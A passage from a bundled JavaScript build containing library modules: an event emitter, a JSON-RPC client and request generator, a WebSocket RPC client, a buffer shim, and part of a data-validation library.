        var evt = prefix ? prefix + event : event;
        if (!this._events[evt]) return false;
        var listeners = this._events[evt],
          len = arguments.length,
          args,
          i;
        if (listeners.fn) {
          if (listeners.once) this.removeListener(event, listeners.fn, undefined, true);
          switch (len) {
            case 1:
              return listeners.fn.call(listeners.context), true;
            case 2:
              return listeners.fn.call(listeners.context, a1), true;
            case 3:
              return listeners.fn.call(listeners.context, a1, a2), true;
            case 4:
              return listeners.fn.call(listeners.context, a1, a2, a3), true;
            case 5:
              return listeners.fn.call(listeners.context, a1, a2, a3, a4), true;
            case 6:
              return listeners.fn.call(listeners.context, a1, a2, a3, a4, a5), true;
          }
          for (i = 1, args = new Array(len - 1); i < len; i++) {
            args[i - 1] = arguments[i];
          }
          listeners.fn.apply(listeners.context, args);
        } else {
          var length = listeners.length,
            j;
          for (i = 0; i < length; i++) {
            if (listeners[i].once) this.removeListener(event, listeners[i].fn, undefined, true);
            switch (len) {
              case 1:
                listeners[i].fn.call(listeners[i].context);
                break;
              case 2:
                listeners[i].fn.call(listeners[i].context, a1);
                break;
              case 3:
                listeners[i].fn.call(listeners[i].context, a1, a2);
                break;
              case 4:
                listeners[i].fn.call(listeners[i].context, a1, a2, a3);
                break;
              default:
                if (!args) for (j = 1, args = new Array(len - 1); j < len; j++) {
                  args[j - 1] = arguments[j];
                }
                listeners[i].fn.apply(listeners[i].context, args);
            }
          }
        }
        return true;
      };
      EventEmitter.prototype.on = function on(event, fn, context) {
        return addListener(this, event, fn, context, false);
      };
      EventEmitter.prototype.once = function once(event, fn, context) {
        return addListener(this, event, fn, context, true);
      };
      EventEmitter.prototype.removeListener = function removeListener(event, fn, context, once) {
        var evt = prefix ? prefix + event : event;
        if (!this._events[evt]) return this;
        if (!fn) {
          clearEvent(this, evt);
          return this;
        }
        var listeners = this._events[evt];
        if (listeners.fn) {
          if (listeners.fn === fn && (!once || listeners.once) && (!context || listeners.context === context)) {
            clearEvent(this, evt);
          }
        } else {
          for (var i = 0, events = [], length = listeners.length; i < length; i++) {
            if (listeners[i].fn !== fn || once && !listeners[i].once || context && listeners[i].context !== context) {
              events.push(listeners[i]);
            }
          }
          if (events.length) this._events[evt] = events.length === 1 ? events[0] : events;else clearEvent(this, evt);
        }
        return this;
      };
      EventEmitter.prototype.removeAllListeners = function removeAllListeners(event) {
        var evt;
        if (event) {
          evt = prefix ? prefix + event : event;
          if (this._events[evt]) clearEvent(this, evt);
        } else {
          this._events = new Events();
          this._eventsCount = 0;
        }
        return this;
      };
      EventEmitter.prototype.off = EventEmitter.prototype.removeListener;
      EventEmitter.prototype.addListener = EventEmitter.prototype.on;
      EventEmitter.prefixed = prefix;
      EventEmitter.EventEmitter = EventEmitter;
      if ('undefined' !== typeof module) {
        module.exports = EventEmitter;
      }
    }, {}],
    55: [function (require, module, exports) {
      'use strict';

      const uuid = require('uuid').v4;
      const generateRequest = require('../../generateRequest');
      const ClientBrowser = function (callServer, options) {
        if (!(this instanceof ClientBrowser)) {
          return new ClientBrowser(callServer, options);
        }
        if (!options) {
          options = {};
        }
        this.options = {
          reviver: typeof options.reviver !== 'undefined' ? options.reviver : null,
          replacer: typeof options.replacer !== 'undefined' ? options.replacer : null,
          generator: typeof options.generator !== 'undefined' ? options.generator : function () {
            return uuid();
          },
          version: typeof options.version !== 'undefined' ? options.version : 2,
          notificationIdNull: typeof options.notificationIdNull === 'boolean' ? options.notificationIdNull : false
        };
        this.callServer = callServer;
      };
      module.exports = ClientBrowser;
      ClientBrowser.prototype.request = function (method, params, id, callback) {
        const self = this;
        let request = null;
        const isBatch = Array.isArray(method) && typeof params === 'function';
        if (this.options.version === 1 && isBatch) {
          throw new TypeError('JSON-RPC 1.0 does not support batching');
        }
        const isRaw = !isBatch && method && typeof method === 'object' && typeof params === 'function';
        if (isBatch || isRaw) {
          callback = params;
          request = method;
        } else {
          if (typeof id === 'function') {
            callback = id;
            id = undefined;
          }
          const hasCallback = typeof callback === 'function';
          try {
            request = generateRequest(method, params, id, {
              generator: this.options.generator,
              version: this.options.version,
              notificationIdNull: this.options.notificationIdNull
            });
          } catch (err) {
            if (hasCallback) {
              return callback(err);
            }
            throw err;
          }
          if (!hasCallback) {
            return request;
          }
        }
        let message;
        try {
          message = JSON.stringify(request, this.options.replacer);
        } catch (err) {
          return callback(err);
        }
        this.callServer(message, function (err, response) {
          self._parseResponse(err, response, callback);
        });
        return request;
      };
      ClientBrowser.prototype._parseResponse = function (err, responseText, callback) {
        if (err) {
          callback(err);
          return;
        }
        if (!responseText) {
          return callback();
        }
        let response;
        try {
          response = JSON.parse(responseText, this.options.reviver);
        } catch (err) {
          return callback(err);
        }
        if (callback.length === 3) {
          if (Array.isArray(response)) {
            const isError = function (res) {
              return typeof res.error !== 'undefined';
            };
            const isNotError = function (res) {
              return !isError(res);
            };
            return callback(null, response.filter(isError), response.filter(isNotError));
          } else {
            return callback(null, response.error, response.result);
          }
        }
        callback(null, response);
      };
    }, {
      "../../generateRequest": 56,
      "uuid": 63
    }],
    56: [function (require, module, exports) {
      'use strict';

      const uuid = require('uuid').v4;
      const generateRequest = function (method, params, id, options) {
        if (typeof method !== 'string') {
          throw new TypeError(method + ' must be a string');
        }
        options = options || {};
        const version = typeof options.version === 'number' ? options.version : 2;
        if (version !== 1 && version !== 2) {
          throw new TypeError(version + ' must be 1 or 2');
        }
        const request = {
          method: method
        };
        if (version === 2) {
          request.jsonrpc = '2.0';
        }
        if (params) {
          if (typeof params !== 'object' && !Array.isArray(params)) {
            throw new TypeError(params + ' must be an object, array or omitted');
          }
          request.params = params;
        }
        if (typeof id === 'undefined') {
          const generator = typeof options.generator === 'function' ? options.generator : function () {
            return uuid();
          };
          request.id = generator(request, options);
        } else if (version === 2 && id === null) {
          if (options.notificationIdNull) {
            request.id = null;
          }
        } else {
          request.id = id;
        }
        return request;
      };
      module.exports = generateRequest;
    }, {
      "uuid": 63
    }],
    57: [function (require, module, exports) {
      "use strict";

      var _interopRequireDefault = require("@babel/runtime/helpers/interopRequireDefault");
      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.Client = void 0;
      var _createClass2 = _interopRequireDefault(require("@babel/runtime/helpers/createClass"));
      var _classCallCheck2 = _interopRequireDefault(require("@babel/runtime/helpers/classCallCheck"));
      var _inherits2 = _interopRequireDefault(require("@babel/runtime/helpers/inherits"));
      var _possibleConstructorReturn2 = _interopRequireDefault(require("@babel/runtime/helpers/possibleConstructorReturn"));
      var _getPrototypeOf2 = _interopRequireDefault(require("@babel/runtime/helpers/getPrototypeOf"));
      var _websocket = _interopRequireDefault(require("./lib/client/websocket.browser"));
      var _client = _interopRequireDefault(require("./lib/client"));
      function _createSuper(Derived) {
        var hasNativeReflectConstruct = _isNativeReflectConstruct();
        return function _createSuperInternal() {
          var Super = (0, _getPrototypeOf2["default"])(Derived),
            result;
          if (hasNativeReflectConstruct) {
            var NewTarget = (0, _getPrototypeOf2["default"])(this).constructor;
            result = Reflect.construct(Super, arguments, NewTarget);
          } else {
            result = Super.apply(this, arguments);
          }
          return (0, _possibleConstructorReturn2["default"])(this, result);
        };
      }
      function _isNativeReflectConstruct() {
        if (typeof Reflect === "undefined" || !Reflect.construct) return false;
        if (Reflect.construct.sham) return false;
        if (typeof Proxy === "function") return true;
        try {
          Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
          return true;
        } catch (e) {
          return false;
        }
      }
      var Client = function (_CommonClient) {
        (0, _inherits2["default"])(Client, _CommonClient);
        var _super = _createSuper(Client);
        function Client() {
          var address = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : "ws://localhost:8080";
          var _ref = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {},
            _ref$autoconnect = _ref.autoconnect,
            autoconnect = _ref$autoconnect === void 0 ? true : _ref$autoconnect,
            _ref$reconnect = _ref.reconnect,
            reconnect = _ref$reconnect === void 0 ? true : _ref$reconnect,
            _ref$reconnect_interv = _ref.reconnect_interval,
            reconnect_interval = _ref$reconnect_interv === void 0 ? 1000 : _ref$reconnect_interv,
            _ref$max_reconnects = _ref.max_reconnects,
            max_reconnects = _ref$max_reconnects === void 0 ? 5 : _ref$max_reconnects;
          var generate_request_id = arguments.length > 2 ? arguments[2] : undefined;
          (0, _classCallCheck2["default"])(this, Client);
          return _super.call(this, _websocket["default"], address, {
            autoconnect: autoconnect,
            reconnect: reconnect,
            reconnect_interval: reconnect_interval,
            max_reconnects: max_reconnects
          }, generate_request_id);
        }
        return (0, _createClass2["default"])(Client);
      }(_client["default"]);
      exports.Client = Client;
    }, {
      "./lib/client": 58,
      "./lib/client/websocket.browser": 59,
      "@babel/runtime/helpers/classCallCheck": 7,
      "@babel/runtime/helpers/createClass": 8,
      "@babel/runtime/helpers/getPrototypeOf": 9,
      "@babel/runtime/helpers/inherits": 10,
      "@babel/runtime/helpers/interopRequireDefault": 11,
      "@babel/runtime/helpers/possibleConstructorReturn": 12
    }],
    58: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          var _interopRequireDefault = require("@babel/runtime/helpers/interopRequireDefault");
          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports["default"] = void 0;
          var _regenerator = _interopRequireDefault(require("@babel/runtime/regenerator"));
          var _asyncToGenerator2 = _interopRequireDefault(require("@babel/runtime/helpers/asyncToGenerator"));
          var _typeof2 = _interopRequireDefault(require("@babel/runtime/helpers/typeof"));
          var _classCallCheck2 = _interopRequireDefault(require("@babel/runtime/helpers/classCallCheck"));
          var _createClass2 = _interopRequireDefault(require("@babel/runtime/helpers/createClass"));
          var _inherits2 = _interopRequireDefault(require("@babel/runtime/helpers/inherits"));
          var _possibleConstructorReturn2 = _interopRequireDefault(require("@babel/runtime/helpers/possibleConstructorReturn"));
          var _getPrototypeOf2 = _interopRequireDefault(require("@babel/runtime/helpers/getPrototypeOf"));
          var _eventemitter = require("eventemitter3");
          function _createSuper(Derived) {
            var hasNativeReflectConstruct = _isNativeReflectConstruct();
            return function _createSuperInternal() {
              var Super = (0, _getPrototypeOf2["default"])(Derived),
                result;
              if (hasNativeReflectConstruct) {
                var NewTarget = (0, _getPrototypeOf2["default"])(this).constructor;
                result = Reflect.construct(Super, arguments, NewTarget);
              } else {
                result = Super.apply(this, arguments);
              }
              return (0, _possibleConstructorReturn2["default"])(this, result);
            };
          }
          function _isNativeReflectConstruct() {
            if (typeof Reflect === "undefined" || !Reflect.construct) return false;
            if (Reflect.construct.sham) return false;
            if (typeof Proxy === "function") return true;
            try {
              Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
              return true;
            } catch (e) {
              return false;
            }
          }
          var __rest = void 0 && (void 0).__rest || function (s, e) {
            var t = {};
            for (var p in s) {
              if (Object.prototype.hasOwnProperty.call(s, p) && e.indexOf(p) < 0) t[p] = s[p];
            }
            if (s != null && typeof Object.getOwnPropertySymbols === "function") for (var i = 0, p = Object.getOwnPropertySymbols(s); i < p.length; i++) {
              if (e.indexOf(p[i]) < 0 && Object.prototype.propertyIsEnumerable.call(s, p[i])) t[p[i]] = s[p[i]];
            }
            return t;
          };
          var CommonClient = function (_EventEmitter) {
            (0, _inherits2["default"])(CommonClient, _EventEmitter);
            var _super = _createSuper(CommonClient);
            function CommonClient(webSocketFactory) {
              var _this;
              var address = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "ws://localhost:8080";
              var _a = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {};
              var generate_request_id = arguments.length > 3 ? arguments[3] : undefined;
              (0, _classCallCheck2["default"])(this, CommonClient);
              var _a$autoconnect = _a.autoconnect,
                autoconnect = _a$autoconnect === void 0 ? true : _a$autoconnect,
                _a$reconnect = _a.reconnect,
                reconnect = _a$reconnect === void 0 ? true : _a$reconnect,
                _a$reconnect_interval = _a.reconnect_interval,
                reconnect_interval = _a$reconnect_interval === void 0 ? 1000 : _a$reconnect_interval,
                _a$max_reconnects = _a.max_reconnects,
                max_reconnects = _a$max_reconnects === void 0 ? 5 : _a$max_reconnects,
                rest_options = __rest(_a, ["autoconnect", "reconnect", "reconnect_interval", "max_reconnects"]);
              _this = _super.call(this);
              _this.webSocketFactory = webSocketFactory;
              _this.queue = {};
              _this.rpc_id = 0;
              _this.address = address;
              _this.autoconnect = autoconnect;
              _this.ready = false;
              _this.reconnect = reconnect;
              _this.reconnect_interval = reconnect_interval;
              _this.max_reconnects = max_reconnects;
              _this.rest_options = rest_options;
              _this.current_reconnects = 0;
              _this.generate_request_id = generate_request_id || function () {
                return ++_this.rpc_id;
              };
              if (_this.autoconnect) _this._connect(_this.address, Object.assign({
                autoconnect: _this.autoconnect,
                reconnect: _this.reconnect,
                reconnect_interval: _this.reconnect_interval,
                max_reconnects: _this.max_reconnects
              }, _this.rest_options));
              return _this;
            }
            (0, _createClass2["default"])(CommonClient, [{
              key: "connect",
              value: function connect() {
                if (this.socket) return;
                this._connect(this.address, Object.assign({
                  autoconnect: this.autoconnect,
                  reconnect: this.reconnect,
                  reconnect_interval: this.reconnect_interval,
                  max_reconnects: this.max_reconnects
                }, this.rest_options));
              }
            }, {
              key: "call",
              value: function call(method, params, timeout, ws_opts) {
                var _this2 = this;
                if (!ws_opts && "object" === (0, _typeof2["default"])(timeout)) {
                  ws_opts = timeout;
                  timeout = null;
                }
                return new Promise(function (resolve, reject) {
                  if (!_this2.ready) return reject(new Error("socket not ready"));
                  var rpc_id = _this2.generate_request_id(method, params);
                  var message = {
                    jsonrpc: "2.0",
                    method: method,
                    params: params || null,
                    id: rpc_id
                  };
                  _this2.socket.send(JSON.stringify(message), ws_opts, function (error) {
                    if (error) return reject(error);
                    _this2.queue[rpc_id] = {
                      promise: [resolve, reject]
                    };
                    if (timeout) {
                      _this2.queue[rpc_id].timeout = setTimeout(function () {
                        delete _this2.queue[rpc_id];
                        reject(new Error("reply timeout"));
                      }, timeout);
                    }
                  });
                });
              }
            }, {
              key: "login",
              value: function () {
                var _login = (0, _asyncToGenerator2["default"])(_regenerator["default"].mark(function _callee(params) {
                  var resp;
                  return _regenerator["default"].wrap(function _callee$(_context) {
                    while (1) {
                      switch (_context.prev = _context.next) {
                        case 0:
                          _context.next = 2;
                          return this.call("rpc.login", params);
                        case 2:
                          resp = _context.sent;
                          if (resp) {
                            _context.next = 5;
                            break;
                          }
                          throw new Error("authentication failed");
                        case 5:
                          return _context.abrupt("return", resp);
                        case 6:
                        case "end":
                          return _context.stop();
                      }
                    }
                  }, _callee, this);
                }));
                function login(_x) {
                  return _login.apply(this, arguments);
                }
                return login;
              }()
            }, {
              key: "listMethods",
              value: function () {
                var _listMethods = (0, _asyncToGenerator2["default"])(_regenerator["default"].mark(function _callee2() {
                  return _regenerator["default"].wrap(function _callee2$(_context2) {
                    while (1) {
                      switch (_context2.prev = _context2.next) {
                        case 0:
                          _context2.next = 2;
                          return this.call("__listMethods");
                        case 2:
                          return _context2.abrupt("return", _context2.sent);
                        case 3:
                        case "end":
                          return _context2.stop();
                      }
                    }
                  }, _callee2, this);
                }));
                function listMethods() {
                  return _listMethods.apply(this, arguments);
                }
                return listMethods;
              }()
            }, {
              key: "notify",
              value: function notify(method, params) {
                var _this3 = this;
                return new Promise(function (resolve, reject) {
                  if (!_this3.ready) return reject(new Error("socket not ready"));
                  var message = {
                    jsonrpc: "2.0",
                    method: method,
                    params: params || null
                  };
                  _this3.socket.send(JSON.stringify(message), function (error) {
                    if (error) return reject(error);
                    resolve();
                  });
                });
              }
            }, {
              key: "subscribe",
              value: function () {
                var _subscribe = (0, _asyncToGenerator2["default"])(_regenerator["default"].mark(function _callee3(event) {
                  var result;
                  return _regenerator["default"].wrap(function _callee3$(_context3) {
                    while (1) {
                      switch (_context3.prev = _context3.next) {
                        case 0:
                          if (typeof event === "string") event = [event];
                          _context3.next = 3;
                          return this.call("rpc.on", event);
                        case 3:
                          result = _context3.sent;
                          if (!(typeof event === "string" && result[event] !== "ok")) {
                            _context3.next = 6;
                            break;
                          }
                          throw new Error("Failed subscribing to an event '" + event + "' with: " + result[event]);
                        case 6:
                          return _context3.abrupt("return", result);
                        case 7:
                        case "end":
                          return _context3.stop();
                      }
                    }
                  }, _callee3, this);
                }));
                function subscribe(_x2) {
                  return _subscribe.apply(this, arguments);
                }
                return subscribe;
              }()
            }, {
              key: "unsubscribe",
              value: function () {
                var _unsubscribe = (0, _asyncToGenerator2["default"])(_regenerator["default"].mark(function _callee4(event) {
                  var result;
                  return _regenerator["default"].wrap(function _callee4$(_context4) {
                    while (1) {
                      switch (_context4.prev = _context4.next) {
                        case 0:
                          if (typeof event === "string") event = [event];
                          _context4.next = 3;
                          return this.call("rpc.off", event);
                        case 3:
                          result = _context4.sent;
                          if (!(typeof event === "string" && result[event] !== "ok")) {
                            _context4.next = 6;
                            break;
                          }
                          throw new Error("Failed unsubscribing from an event with: " + result);
                        case 6:
                          return _context4.abrupt("return", result);
                        case 7:
                        case "end":
                          return _context4.stop();
                      }
                    }
                  }, _callee4, this);
                }));
                function unsubscribe(_x3) {
                  return _unsubscribe.apply(this, arguments);
                }
                return unsubscribe;
              }()
            }, {
              key: "close",
              value: function close(code, data) {
                this.socket.close(code || 1000, data);
              }
            }, {
              key: "_connect",
              value: function _connect(address, options) {
                var _this4 = this;
                this.socket = this.webSocketFactory(address, options);
                this.socket.addEventListener("open", function () {
                  _this4.ready = true;
                  _this4.emit("open");
                  _this4.current_reconnects = 0;
                });
                this.socket.addEventListener("message", function (_ref) {
                  var message = _ref.data;
                  if (message instanceof ArrayBuffer) message = Buffer.from(message).toString();
                  try {
                    message = JSON.parse(message);
                  } catch (error) {
                    return;
                  }
                  if (message.notification && _this4.listeners(message.notification).length) {
                    if (!Object.keys(message.params).length) return _this4.emit(message.notification);
                    var args = [message.notification];
                    if (message.params.constructor === Object) args.push(message.params);else for (var i = 0; i < message.params.length; i++) {
                      args.push(message.params[i]);
                    }
                    return Promise.resolve().then(function () {
                      _this4.emit.apply(_this4, args);
                    });
                  }
                  if (!_this4.queue[message.id]) {
                    if (message.method && message.params) {
                      return Promise.resolve().then(function () {
                        _this4.emit(message.method, message.params);
                      });
                    }
                    return;
                  }
                  if ("error" in message === "result" in message) _this4.queue[message.id].promise[1](new Error("Server response malformed. Response must include either \"result\"" + " or \"error\", but not both."));
                  if (_this4.queue[message.id].timeout) clearTimeout(_this4.queue[message.id].timeout);
                  if (message.error) _this4.queue[message.id].promise[1](message.error);else _this4.queue[message.id].promise[0](message.result);
                  delete _this4.queue[message.id];
                });
                this.socket.addEventListener("error", function (error) {
                  return _this4.emit("error", error);
                });
                this.socket.addEventListener("close", function (_ref2) {
                  var code = _ref2.code,
                    reason = _ref2.reason;
                  if (_this4.ready) setTimeout(function () {
                    return _this4.emit("close", code, reason);
                  }, 0);
                  _this4.ready = false;
                  _this4.socket = undefined;
                  if (code === 1000) return;
                  _this4.current_reconnects++;
                  if (_this4.reconnect && (_this4.max_reconnects > _this4.current_reconnects || _this4.max_reconnects === 0)) setTimeout(function () {
                    return _this4._connect(address, options);
                  }, _this4.reconnect_interval);
                });
              }
            }]);
            return CommonClient;
          }(_eventemitter.EventEmitter);
          exports["default"] = CommonClient;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "@babel/runtime/helpers/asyncToGenerator": 6,
      "@babel/runtime/helpers/classCallCheck": 7,
      "@babel/runtime/helpers/createClass": 8,
      "@babel/runtime/helpers/getPrototypeOf": 9,
      "@babel/runtime/helpers/inherits": 10,
      "@babel/runtime/helpers/interopRequireDefault": 11,
      "@babel/runtime/helpers/possibleConstructorReturn": 12,
      "@babel/runtime/helpers/typeof": 15,
      "@babel/runtime/regenerator": 16,
      "buffer": 3,
      "eventemitter3": 54
    }],
    59: [function (require, module, exports) {
      "use strict";

      var _interopRequireDefault = require("@babel/runtime/helpers/interopRequireDefault");
      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports["default"] = _default;
      var _classCallCheck2 = _interopRequireDefault(require("@babel/runtime/helpers/classCallCheck"));
      var _createClass2 = _interopRequireDefault(require("@babel/runtime/helpers/createClass"));
      var _inherits2 = _interopRequireDefault(require("@babel/runtime/helpers/inherits"));
      var _possibleConstructorReturn2 = _interopRequireDefault(require("@babel/runtime/helpers/possibleConstructorReturn"));
      var _getPrototypeOf2 = _interopRequireDefault(require("@babel/runtime/helpers/getPrototypeOf"));
      var _eventemitter = require("eventemitter3");
      function _createSuper(Derived) {
        var hasNativeReflectConstruct = _isNativeReflectConstruct();
        return function _createSuperInternal() {
          var Super = (0, _getPrototypeOf2["default"])(Derived),
            result;
          if (hasNativeReflectConstruct) {
            var NewTarget = (0, _getPrototypeOf2["default"])(this).constructor;
            result = Reflect.construct(Super, arguments, NewTarget);
          } else {
            result = Super.apply(this, arguments);
          }
          return (0, _possibleConstructorReturn2["default"])(this, result);
        };
      }
      function _isNativeReflectConstruct() {
        if (typeof Reflect === "undefined" || !Reflect.construct) return false;
        if (Reflect.construct.sham) return false;
        if (typeof Proxy === "function") return true;
        try {
          Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
          return true;
        } catch (e) {
          return false;
        }
      }
      var WebSocketBrowserImpl = function (_EventEmitter) {
        (0, _inherits2["default"])(WebSocketBrowserImpl, _EventEmitter);
        var _super = _createSuper(WebSocketBrowserImpl);
        function WebSocketBrowserImpl(address, options, protocols) {
          var _this;
          (0, _classCallCheck2["default"])(this, WebSocketBrowserImpl);
          _this = _super.call(this);
          _this.socket = new window.WebSocket(address, protocols);
          _this.socket.onopen = function () {
            return _this.emit("open");
          };
          _this.socket.onmessage = function (event) {
            return _this.emit("message", event.data);
          };
          _this.socket.onerror = function (error) {
            return _this.emit("error", error);
          };
          _this.socket.onclose = function (event) {
            _this.emit("close", event.code, event.reason);
          };
          return _this;
        }
        (0, _createClass2["default"])(WebSocketBrowserImpl, [{
          key: "send",
          value: function send(data, optionsOrCallback, callback) {
            var cb = callback || optionsOrCallback;
            try {
              this.socket.send(data);
              cb();
            } catch (error) {
              cb(error);
            }
          }
        }, {
          key: "close",
          value: function close(code, reason) {
            this.socket.close(code, reason);
          }
        }, {
          key: "addEventListener",
          value: function addEventListener(type, listener, options) {
            this.socket.addEventListener(type, listener, options);
          }
        }]);
        return WebSocketBrowserImpl;
      }(_eventemitter.EventEmitter);
      function _default(address, options) {
        return new WebSocketBrowserImpl(address, options);
      }
    }, {
      "@babel/runtime/helpers/classCallCheck": 7,
      "@babel/runtime/helpers/createClass": 8,
      "@babel/runtime/helpers/getPrototypeOf": 9,
      "@babel/runtime/helpers/inherits": 10,
      "@babel/runtime/helpers/interopRequireDefault": 11,
      "@babel/runtime/helpers/possibleConstructorReturn": 12,
      "eventemitter3": 54
    }],
    60: [function (require, module, exports) {
      var buffer = require('buffer');
      var Buffer = buffer.Buffer;
      function copyProps(src, dst) {
        for (var key in src) {
          dst[key] = src[key];
        }
      }
      if (Buffer.from && Buffer.alloc && Buffer.allocUnsafe && Buffer.allocUnsafeSlow) {
        module.exports = buffer;
      } else {
        copyProps(buffer, exports);
        exports.Buffer = SafeBuffer;
      }
      function SafeBuffer(arg, encodingOrOffset, length) {
        return Buffer(arg, encodingOrOffset, length);
      }
      SafeBuffer.prototype = Object.create(Buffer.prototype);
      copyProps(Buffer, SafeBuffer);
      SafeBuffer.from = function (arg, encodingOrOffset, length) {
        if (typeof arg === 'number') {
          throw new TypeError('Argument must not be a number');
        }
        return Buffer(arg, encodingOrOffset, length);
      };
      SafeBuffer.alloc = function (size, fill, encoding) {
        if (typeof size !== 'number') {
          throw new TypeError('Argument must be a number');
        }
        var buf = Buffer(size);
        if (fill !== undefined) {
          if (typeof encoding === 'string') {
            buf.fill(fill, encoding);
          } else {
            buf.fill(fill);
          }
        } else {
          buf.fill(0);
        }
        return buf;
      };
      SafeBuffer.allocUnsafe = function (size) {
        if (typeof size !== 'number') {
          throw new TypeError('Argument must be a number');
        }
        return Buffer(size);
      };
      SafeBuffer.allocUnsafeSlow = function (size) {
        if (typeof size !== 'number') {
          throw new TypeError('Argument must be a number');
        }
        return buffer.SlowBuffer(size);
      };
    }, {
      "buffer": 3
    }],
    61: [function (require, module, exports) {
      'use strict';

      Object.defineProperty(exports, '__esModule', {
        value: true
      });
      class StructError extends TypeError {
        constructor(failure, failures) {
          let cached;
          const {
            message,
            ...rest
          } = failure;
          const {
            path
          } = failure;
          const msg = path.length === 0 ? message : "At path: " + path.join('.') + " -- " + message;
          super(msg);
          Object.assign(this, rest);
          this.name = this.constructor.name;
          this.failures = () => {
            var _cached;
            return (_cached = cached) != null ? _cached : cached = [failure, ...failures()];
          };
        }
      }
      function isIterable(x) {
        return isObject(x) && typeof x[Symbol.iterator] === 'function';
      }
      function isObject(x) {
        return typeof x === 'object' && x != null;
      }
      function isPlainObject(x) {
        if (Object.prototype.toString.call(x) !== '[object Object]') {
          return false;
        }
        const prototype = Object.getPrototypeOf(x);
        return prototype === null || prototype === Object.prototype;
      }
      function print(value) {
        return typeof value === 'string' ? JSON.stringify(value) : "" + value;
      }
      function shiftIterator(input) {
        const {
          done,
          value
        } = input.next();
        return done ? undefined : value;
      }
      function toFailure(result, context, struct, value) {
        if (result === true) {
          return;
        } else if (result === false) {
          result = {};
        } else if (typeof result === 'string') {
          result = {
            message: result
          };
        }
        const {
          path,
          branch
        } = context;
        const {
          type
        } = struct;
        const {
          refinement,
          message = "Expected a value of type `" + type + "`" + (refinement ? " with refinement `" + refinement + "`" : '') + ", but received: `" + print(value) + "`"
        } = result;
        return {
          value,
          type,
          refinement,
          key: path[path.length - 1],
          path,
          branch,
          ...result,
          message
        };
      }
      function* toFailures(result, context, struct, value) {
        if (!isIterable(result)) {
          result = [result];
        }
        for (const r of result) {
          const failure = toFailure(r, context, struct, value);
          if (failure) {
            yield failure;
          }
        }
      }
      function* run(value, struct, options = {}) {
        const {
          path = [],
          branch = [value],
          coerce = false,
          mask = false
        } = options;
        const ctx = {
          path,
          branch
        };
        if (coerce) {
          value = struct.coercer(value, ctx);
          if (mask && struct.type !== 'type' && isObject(struct.schema) && isObject(value) && !Array.isArray(value)) {
            for (const key in value) {
              if (struct.schema[key] === undefined) {
                delete value[key];
              }
            }
          }
        }
        let valid = true;
        for (const failure of struct.validator(value, ctx)) {
          valid = false;
          yield [failure, undefined];
        }
        for (let [k, v, s] of struct.entries(value, ctx)) {
          const ts = run(v, s, {
            path: k === undefined ? path : [...path, k],
            branch: k === undefined ? branch : [...branch, v],
            coerce,
            mask
          });
          for (const t of ts) {
            if (t[0]) {
              valid = false;
              yield [t[0], undefined];
            } else if (coerce) {
              v = t[1];
              if (k === undefined) {
                value = v;
              } else if (value instanceof Map) {
                value.set(k, v);
              } else if (value instanceof Set) {
                value.add(v);
              } else if (isObject(value)) {
                value[k] = v;
              }
            }
          }
        }
        if (valid) {
          for (const failure of struct.refiner(value, ctx)) {
            valid = false;
            yield [failure, undefined];
          }
        }
        if (valid) {
          yield [undefined, value];
        }
      }
      class Struct {
        constructor(props) {
          const {
            type,
            schema,
            validator,
            refiner,
            coercer = value => value,
            entries = function* () {}
          } = props;
          this.type = type;
          this.schema = schema;
          this.entries = entries;
          this.coercer = coercer;
          if (validator) {
            this.validator = (value, context) => {
              const result = validator(value, context);
              return toFailures(result, context, this, value);
            };
          } else {
            this.validator = () => [];
          }
          if (refiner) {
            this.refiner = (value, context) => {
              const result = refiner(value, context);
              return toFailures(result, context, this, value);
            };
          } else {
            this.refiner = () => [];
          }
        }
        assert(value) {
          return assert(value, this);
        }
        create(value) {
          return create(value, this);
        }
        is(value) {
          return is(value, this);
        }
        mask(value) {
          return mask(value, this);
        }
        validate(value, options = {}) {
          return validate(value, this, options);
        }
      }
      function assert(value, struct) {
        const result = validate(value, struct);
        if (result[0]) {
          throw result[0];
        }
      }
      function create(value, struct) {
        const result = validate(value, struct, {
          coerce: true
        });
        if (result[0]) {
          throw result[0];
        } else {
          return result[1];
        }
      }
      function mask(value, struct) {
        const result = validate(value, struct, {
          coerce: true,
          mask: true
        });
        if (result[0]) {
          throw result[0];
        } else {
          return result[1];
        }
      }
      function is(value, struct) {
        const result = validate(value, struct);
        return !result[0];
      }
      function validate(value, struct, options = {}) {
        const tuples = run(value, struct, options);
        const tuple = shiftIterator(tuples);
        if (tuple[0]) {
          const error = new StructError(tuple[0], function* () {
            for (const t of tuples) {
              if (t[0]) {
                yield t[0];
              }
            }
          });
          return [error, undefined];
        } else {
          const v = tuple[1];
          return [undefined, v];
        }
      }
      function assign(...Structs) {
        const schemas = Structs.map(s => s.schema);
        const schema = Object.assign({}, ...schemas);
        return object(schema);
      }
      function define(name, validator) {
        return new Struct({
          type: name,
          schema: null,
          validator
        });
      }
      function deprecated(struct, log) {
        return new Struct({
          ...struct,
          refiner: (value, ctx) => value === undefined || struct.refiner(value, ctx),
          validator(value, ctx) {
            if (value === undefined) {
              return true;
            } else {
              log(value, ctx);
              return struct.validator(value, ctx);
            }
          }
        });
      }
      function dynamic(fn) {
        return new Struct({
          type: 'dynamic',
          schema: null,
          *entries(value, ctx) {
            const struct = fn(value, ctx);
            yield* struct.entries(value, ctx);
          },
          validator(value, ctx) {
            const struct = fn(value, ctx);
            return struct.validator(value, ctx);
          },
          coercer(value, ctx) {
            const struct = fn(value, ctx);
            return struct.coercer(value, ctx);
          }
        });
      }
      function lazy(fn) {
        let struct;
        return new Struct({
          type: 'lazy',
          schema: null,
          *entries(value, ctx) {
            var _struct;
            (_struct = struct) != null ? _struct : struct = fn();
            yield* struct.entries(value, ctx);
          },
          validator(value, ctx) {
            var _struct2;
            (_struct2 = struct) != null ? _struct2 : struct = fn();
            return struct.validator(value, ctx);
          },
          coercer(value, ctx) {
            var _struct3;
            (_struct3 = struct) != null ? _struct3 : struct = fn();
